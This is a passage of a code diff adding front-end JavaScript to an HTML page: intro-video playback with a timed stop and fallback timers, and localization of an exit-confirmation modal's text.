+        try { video.pause(); video.currentTime = STOP_AT; video.setAttribute("poster", POSTER); } catch {}
+        playBtn.classList.add("ready");
+        cleanup();
+      };
+
+      const onTime = () => { if (video.currentTime >= STOP_AT) finish(); };
+      video.addEventListener("timeupdate", onTime);
+      const hardFallback = setTimeout(finish, 3500);
+      const playWatchdog = setTimeout(() => { if ((video.currentTime || 0) <= 0.05) finish(); }, 2200);
+
+      const start = async () => {
+        try { video.muted = true; video.playsInline = true; const pr = video.play(); if (pr && pr.then) await pr; } catch { finish(); }
+      };
+
+      if (document.visibilityState === "visible") start();
+      else {
+        const onFirstVisible = () => { if (document.visibilityState === "visible") { start(); document.removeEventListener("visibilitychange", onFirstVisible); } };
+        document.addEventListener("visibilitychange", onFirstVisible);
+      }
+    });
+  </script>
+
+  <script>
+    "use strict";
+    (function () {
+      function applyModalI18n() {
+        if (typeof window.__getModalCopy !== "function") return;
+        const copy = window.__getModalCopy();
+        const root = document.getElementById("xh_exit_modal");
+        if (!root) return;
+        const set = (key, val) => { const el = root.querySelector(`[data-i18n="${key}"]`); if (el) el.textContent = val; };
+        set("title", copy.title); set("desc", copy.desc); set("stay", copy.stay); set("leave", copy.leave);
+      }
+      if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", applyModalI18n, { once: true });
+      else applyModalI18n();
+      window.applyModalI18n = applyModalI18n;
+    })();
+  </script>
+
+  <script defer src="./assets/scripts/common.js"></script>
+</body>
+</html>
 
   <script>
     var APP_CONFIG = {
@@ -497,3 +992,4 @@
   <script defer src="./assets/scripts/common.js"></script>
 </body>
 </html>
+
